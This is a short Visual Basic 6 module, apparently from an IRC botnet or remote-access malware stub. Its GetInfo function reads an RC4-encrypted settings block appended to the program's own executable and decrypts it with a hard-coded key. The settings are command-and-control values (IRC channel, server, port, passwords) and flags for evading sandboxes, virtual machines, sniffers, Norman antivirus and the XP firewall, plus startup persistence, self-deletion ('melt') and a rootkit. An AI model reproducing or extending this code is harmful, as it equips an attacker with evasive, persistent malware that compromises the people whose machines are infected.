Attribute VB_Name = "modInfos"
Public channel As String
Public server As String
Public port As String
Public pw As String
Public antisand As String
Public startup As String
Public antisniff As String
Public antinorman As String
Public antivm As String
Public melt As String
Public rootkit As String
Public antixpfw As String
Public process As String
Public channelpass As String
Dim infos As String * 500
Dim cmd() As String

Function GetInfo()
On Error Resume Next
Open App.Path & "\" & App.EXEName & ".exe" For Binary As #1
Get #1, LOF(1) - 99, infos


cmd() = Split(infos, "!")

channel = RC4(cmd(0), "ztrgdcv")
server = RC4(cmd(1), "ztrgdcv")
port = RC4(cmd(2), "ztrgdcv")
pw = RC4(cmd(3), "ztrgdcv")
antisand = RC4(cmd(4), "ztrgdcv")
startup = RC4(cmd(5), "ztrgdcv")
antisniff = RC4(cmd(6), "ztrgdcv")
antinorman = RC4(cmd(7), "ztrgdcv")
antivm = RC4(cmd(8), "ztrgdcv")
melt = RC4(cmd(9), "ztrgdcv")
rootkit = RC4(cmd(10), "ztrgdcv")
antixpfw = RC4(cmd(11), "ztrgdcv")
process = RC4(cmd(12), "ztrgdcv")
channelpass = RC4(cmd(13), "ztrgdcv")
Close #1




End Function





